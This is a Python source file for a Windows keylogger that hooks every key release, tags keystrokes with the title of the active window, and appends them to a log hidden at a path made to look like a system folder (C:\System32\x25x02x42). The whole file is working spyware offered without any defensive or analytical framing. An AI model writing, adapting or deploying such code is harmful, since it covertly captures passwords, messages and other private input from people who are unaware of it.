import keyboard
import os
from win32gui import GetWindowText, GetForegroundWindow


class Keylogger:

    def __init__(self):
        self.flag_application = GetWindowText(GetForegroundWindow())

    def to_file(self, char):
        """
        process a string
        and write it to a file
        """
        if char in ("space", "caps lock"):
            char = ' '
        elif char in ("ctrl", "shift", "tab", "esc", "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10",
                      "f11", "f12", "print screen", "enter", "alt", "right", "down", "left", "up"):
            char = f" ({char}) "

        if char == "backspace":
            # character removal
            with open(r"C:\System32\x25x02x42\klog.txt", 'rb+') as f:
                f.seek(-1, os.SEEK_END)
                f.truncate()
        else:
            # creating a format and writing to a file
            with open(r"C:\System32\x25x02x42\klog.txt", "a", encoding="utf-8") as f:
                if self.flag_application != GetWindowText(GetForegroundWindow()):
                    f.write('\n\n\n' + ("*" * 100) + '\n\n' + GetWindowText(GetForegroundWindow()) + '\n')
                    self.flag_application = GetWindowText(GetForegroundWindow())
                f.write(char)

    def add_hotkey(self, e):
        """
        adding keystrokes to a file
        """
        string = (e, e.event_type, e.name)
        self.to_file(string[-1])

    def read_to_key(self):
        """
        read keystrokes
        """
        while True:
            keyboard.on_release(self.add_hotkey)  # keystroke check
            keyboard.wait()  # wait for pressing


def key_log_start():

    ob1 = Keylogger()   # object creation
    ob1.read_to_key()   # start method call
